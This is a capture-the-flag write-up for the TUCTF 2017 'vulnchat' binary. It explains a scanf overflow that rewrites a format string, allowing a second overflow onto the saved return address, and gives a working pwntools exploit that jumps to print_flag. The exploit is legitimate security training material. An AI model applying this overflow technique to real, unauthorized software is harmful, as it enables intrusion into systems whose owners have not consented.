# tu17_vulnchat - TUCTF 2017 (Format String Overwrite + Ret2Win)

**Binary:** ELF 32-bit, not stripped
**Protections:** No canary, NX enabled, No PIE
**Vulnerability:** scanf("%30s") → overflow to format string → second scanf unlimited → overflow to saved EIP

**Analysis:**

- First scanf("%30s", name[20]) → 10 byte overflow to fmt variable
- Overwrite fmt with "%99s" → second scanf reads 99 bytes into password[20]
- Second overflow reaches saved EIP (offset ~0x31 from password start)
- print_flag at 0x804856b → prints flag.txt contents

**Exploit Steps:**

- Payload 1: 20 bytes filler + "%99s" (overwrite format)
- Payload 2: 0x31 bytes filler + p32(0x804856b) (ret2win)

**Pwntools Exploit (Python 3):**

```python
from pwn import *

p = process('./vuln-chat')

p.recvuntil(b"username: ")

payload1 = b"A" * 20 + b"%99s"
p.sendline(payload1)

p.recvuntil(b"you?")

payload2 = b"B" * 0x31 + p32(0x804856b)
p.sendline(payload2)

print(p.recvall().decode())
```
